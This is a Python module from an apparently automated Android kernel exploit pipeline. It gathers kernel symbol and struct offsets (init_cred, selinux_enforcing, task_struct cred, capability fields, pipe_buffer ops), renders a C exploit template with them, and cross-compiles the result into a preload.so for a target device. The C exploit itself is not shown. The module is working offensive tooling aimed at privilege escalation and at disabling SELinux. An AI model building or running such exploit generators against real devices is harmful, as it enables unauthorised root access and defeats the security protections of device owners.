"""Stage 6: Generate exploit code and compile.

Renders the C exploit template with offset values and cross-compiles
for the target architecture to produce preload.so.
"""

from __future__ import annotations

import logging
import re
import shutil
import subprocess
from pathlib import Path
from typing import Any

from jinja2 import Environment, FileSystemLoader

logger = logging.getLogger(__name__)


def _get_template_env() -> Environment:
    """Get Jinja2 environment pointing to the templates directory."""
    templates_dir = Path(__file__).parent.parent.parent / "templates"
    return Environment(
        loader=FileSystemLoader(str(templates_dir)),
        keep_trailing_newline=True,
    )


def _run_cmd(
    cmd: list[str],
    *,
    timeout: int = 300,
    cwd: str | Path | None = None,
) -> subprocess.CompletedProcess[str]:
    """Run a subprocess command and return the result."""
    logger.debug("Running: %s", " ".join(cmd))
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd)


def select_template(memory_type: str, kernel_version: str | None) -> str:
    """Select the right C exploit template based on memory type and kernel version.

    Returns:
        Template identifier string (e.g., 'dma_heap_default', 'ashmem_default').
    """
    if memory_type == "dma_heap":
        return "dma_heap_default"
    return "ashmem_default"


def generate_exploit_c(
    target_h_path: str | Path,
    offsets_h_path: str | Path,
    memory_type: str,
    output_dir: str | Path,
    device_name: str = "unknown",
    kernel_version: str | None = None,
    kernel_is_gki: bool = False,
    arch: str = "aarch64",
    template_offsets: dict[str, Any] | None = None,
    layout: dict[str, Any] | None = None,
) -> Path:
    """Render exploit.c from the universal exploit.c.j2 template.

    Returns:
        Path to the generated exploit.c file.
    """
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    # Copy headers to output dir for compilation
    target_h = Path(target_h_path)
    offsets_h = Path(offsets_h_path)

    if target_h.exists():
        shutil.copy2(target_h, out_dir / "target.h")
    if offsets_h.exists():
        shutil.copy2(offsets_h, out_dir / "offsets.h")

    # Parse kernel version for template variables
    kernel_major = 0
    kernel_minor = 0
    if kernel_version:
        m = re.match(r"(\d+)\.(\d+)", kernel_version)
        if m:
            kernel_major = int(m.group(1))
            kernel_minor = int(m.group(2))

    # Build template-friendly offsets dict
    # Templates use keys like SELINUX_ENFORCING_OFF, offset_calc uses SELINUX_ENFORCING
    t_offsets = template_offsets or {}
    t_layout = layout or {}

    # Render exploit.c from template
    env = _get_template_env()
    template = env.get_template("exploit/exploit.c.j2")
    content = template.render(
        device_name=device_name,
        memory_type=memory_type,
        is_gki=kernel_is_gki,
        kernel_major=kernel_major,
        kernel_minor=kernel_minor,
        arch=arch,
        offsets=t_offsets,
        layout=t_layout,
    )

    exploit_c_path = out_dir / "exploit.c"
    exploit_c_path.write_text(content)
    logger.info("Generated exploit.c: %s", exploit_c_path)
    return exploit_c_path


def compile_exploit(
    src_dir: str | Path,
    output_dir: str | Path,
    arch: str = "aarch64",
) -> Path | None:
    """Cross-compile exploit with NDK.

    Args:
        src_dir: Directory containing exploit.c and headers.
        output_dir: Directory for compiled output.
        arch: Target architecture.

    Returns:
        Path to the compiled binary, or None on failure.
    """
    src = Path(src_dir)
    out_dir = Path(output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    exploit_c = src / "exploit.c"
    if not exploit_c.exists():
        logger.error("exploit.c not found: %s", exploit_c)
        return None

    output_bin = out_dir / "preload.so"

    # Find NDK compiler
    compiler_map: dict[str, str] = {
        "aarch64": "aarch64-linux-android35-clang",
        "arm": "armv7a-linux-androideabi35-clang",
        "x86_64": "x86_64-linux-android35-clang",
    }
    compiler_name = compiler_map.get(arch, "aarch64-linux-android35-clang")

    # Try to find the compiler — check ANDROID_NDK_HOME and common locations
    import os
    ndk_home = os.environ.get("ANDROID_NDK_HOME", "")
    compiler = compiler_name
    if ndk_home:
        candidate = Path(ndk_home) / "toolchains" / "llvm" / "prebuilt" / "linux-x86_64" / "bin" / compiler_name
        if candidate.exists():
            compiler = str(candidate)

    logger.info("Compiling exploit with %s for %s...", compiler, arch)

    # Verify compiler exists
    if not Path(compiler).exists() and not shutil.which(compiler):
        logger.error("Compiler not found: %s (ANDROID_NDK_HOME=%s)", compiler, os.environ.get("ANDROID_NDK_HOME", ""))
        return None

    cmd = [
        compiler,
        "-O2",
        "-Wall",
        "-v",
        f"-I{src}",
        "-shared",
        "-o", str(output_bin),
        str(exploit_c),
    ]

    proc = _run_cmd(cmd, cwd=str(src))
    if proc.returncode != 0:
        # Print full error output — compilation errors are critical
        error_parts = []
        if proc.stdout:
            error_parts.append(f"STDOUT:\n{proc.stdout}")
        if proc.stderr:
            error_parts.append(f"STDERR:\n{proc.stderr}")
        if not error_parts:
            error_parts.append("(no output — compiler may have crashed)")
        logger.error("Compilation failed (command: %s):\n%s", " ".join(cmd), "\n".join(error_parts))
        return None

    if not output_bin.exists():
        logger.error("Compiler produced no output")
        return None

    logger.info("Compiled preload.so: %s (%d bytes)", output_bin, output_bin.stat().st_size)
    return output_bin


def run(
    prev_result: dict[str, Any],
    work_dir: str | Path,
    device_config: dict[str, Any],
) -> dict[str, Any]:
    """Main entry point for codegen stage.

    Args:
        prev_result: Combined results from previous stages.
        work_dir: Working directory.
        device_config: Device configuration.

    Returns:
        dict with paths to generated files.
    """
    work = Path(work_dir)
    src_dir = work / "codegen"
    output_dir = work / "output"

    device_name = device_config.get("name", "unknown")
    memory_type = prev_result.get("memory_type", "dma_heap")
    kernel_version = prev_result.get("kernel_version")
    arch = prev_result.get("arch", "aarch64")

    target_h_path = prev_result.get("target_h_path")
    offsets_h_path = prev_result.get("offsets_h_path")

    result: dict[str, Any] = {
        "exploit_c_path": None,
        "preload_so_path": None,
    }

    if not target_h_path or not offsets_h_path:
        logger.error("Missing target.h or offsets.h from previous stage")
        return result

    # Build template-friendly offsets dict
    # Templates use keys like SELINUX_ENFORCING_OFF, offset_calc uses SELINUX_ENFORCING
    raw_offsets = prev_result.get("offsets", {})
    raw_layout = prev_result.get("layout", {})
    template_offsets: dict[str, Any] = {}

    suffix_map = {
        "INIT_TASK": "INIT_TASK_OFF",
        "INIT_CRED": "INIT_CRED_OFF",
        "SELINUX_ENFORCING": "SELINUX_ENFORCING_OFF",
        "SELINUX_STATE": "SELINUX_STATE_OFF",
        "ANON_PIPE_BUF_OPS": "ANON_PIPE_BUF_OPS_SYM_OFF",
        "KMALLOC_CACHES": "KMALLOC_CACHES_OFF",
        "NFULNL_LOGGER": "SLIDE_NFULNL_LOGGER_OFF",
        "SECURITY_HOOK_HEADS": "SECURITY_HOOK_HEADS_OFF",
        "DMA_HEAP_FOPS": "DMA_HEAP_FOPS_OFF",
        "ASHMEM_FOPS": "ASHMEM_FOPS_OFF",
        "KIMAGE_TEXT_BASE": "KIMAGE_TEXT_BASE",
    }
    for src_key, dst_key in suffix_map.items():
        if src_key in raw_offsets:
            template_offsets[dst_key] = raw_offsets[src_key]

    struct_offsets = prev_result.get("struct_offsets", {})
    struct_field_map = {
        ("task_struct", "cred"): "TASK_CRED_OFF",
        ("task_struct", "real_cred"): "TASK_REAL_CRED_OFF",
        ("task_struct", "pid"): "TASK_PID_OFF",
        ("task_struct", "tasks"): "TASK_TASKS_OFF",
        ("task_struct", "seccomp"): "TASK_SECCOMP_OFF",
        ("cred", "uid"): "CRED_UID_OFF",
        ("cred", "gid"): "CRED_GID_OFF",
        ("cred", "cap_effective"): "CRED_CAP_EFF_OFF",
        ("cred", "cap_inheritable"): "CRED_CAP_INH_OFF",
        ("cred", "cap_permitted"): "CRED_CAP_PERM_OFF",
        ("cred", "cap_bset"): "CRED_CAP_BSET_OFF",
        ("cred", "security"): "CRED_SECURITY_OFF",
        ("pipe_buffer", "page"): "PIPE_BUF_PAGE_OFF",
        ("pipe_buffer", "ops"): "PIPE_BUF_OPS_OFF",
        ("pipe_buffer", "flags"): "PIPE_BUF_FLAGS_OFF",
        ("pipe_buffer", "private"): "PIPE_BUF_PRIVATE_OFF",
        ("mm_struct", "start_code"): "MM_START_CODE_OFF",
        ("mm_struct", "end_code"): "MM_END_CODE_OFF",
        ("mm_struct", "start_data"): "MM_START_DATA_OFF",
        ("mm_struct", "end_data"): "MM_END_DATA_OFF",
        ("mm_struct", "start_brk"): "MM_START_BRK_OFF",
        ("mm_struct", "brk"): "MM_BRK_OFF",
        ("mm_struct", "start_stack"): "MM_START_STACK_OFF",
    }
    for (struct_name, field_name), dst_key in struct_field_map.items():
        struct = struct_offsets.get(struct_name, {})
        if field_name in struct:
            template_offsets[dst_key] = struct[field_name]

    for key in ("KIMAGE_TEXT_BASE", "PAGE_OFFSET", "VMEMMAP_START", "MODULES_VADDR", "VA_BITS"):
        if key in raw_layout:
            template_offsets[key] = raw_layout[key]

    logger.info("Template offsets: %d entries mapped", len(template_offsets))

    # Generate exploit.c
    exploit_c_path = generate_exploit_c(
        target_h_path=target_h_path,
        offsets_h_path=offsets_h_path,
        memory_type=memory_type,
        output_dir=src_dir,
        device_name=device_name,
        kernel_version=kernel_version,
        kernel_is_gki=prev_result.get("kernel_is_gki", False),
        arch=arch,
        template_offsets=template_offsets,
        layout=raw_layout,
    )
    result["exploit_c_path"] = exploit_c_path

    # Save exploit.c to output for debugging
    if exploit_c_path and exploit_c_path.exists():
        debug_copy = output_dir / device_name / "exploit.c"
        debug_copy.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(exploit_c_path, debug_copy)

    # Compile exploit → preload.so
    exploit_bin = compile_exploit(src_dir, output_dir / device_name, arch=arch)
    if exploit_bin:
        result["preload_so_path"] = exploit_bin

    # Copy headers to device output for reference
    device_output_dir = output_dir / device_name
    device_output_dir.mkdir(parents=True, exist_ok=True)

    if Path(target_h_path).exists():
        shutil.copy2(target_h_path, device_output_dir / "target.h")
    if Path(offsets_h_path).exists():
        shutil.copy2(offsets_h_path, device_output_dir / "offsets.h")
    if exploit_c_path and exploit_c_path.exists():
        shutil.copy2(exploit_c_path, device_output_dir / "exploit.c")

    logger.info("Codegen complete for %s: exploit_c=%s, preload_so=%s",
                device_name, exploit_c_path, exploit_bin)

    return result
